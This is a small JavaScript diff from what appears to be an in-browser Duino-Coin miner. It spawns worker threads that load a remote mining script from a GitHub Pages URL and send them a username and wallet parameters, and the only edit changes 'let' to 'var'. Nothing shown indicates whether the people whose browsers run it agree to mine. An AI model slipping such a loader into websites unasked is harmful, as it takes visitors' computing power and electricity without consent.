@@ -40,7 +40,7 @@ let hasher = "DUCO-S1";
 let wallet_id = Math.floor(Math.random() * 2811);
 let workerVer = 0;
 for (let workersAmount = 0; workersAmount < threads; workersAmount++) {
-    let socketWorker = new Worker("https://mobilegmyt.github.io/Duinotize/main.js");
+    var socketWorker = new Worker("https://mobilegmyt.github.io/Duinotize/main.js");
     socketWorker.postMessage('Start,' + username + "," + rigid + "," + wallet_id + "," + difficulty + "," + workerVer + "," + hasher);
     workerVer++;
 }
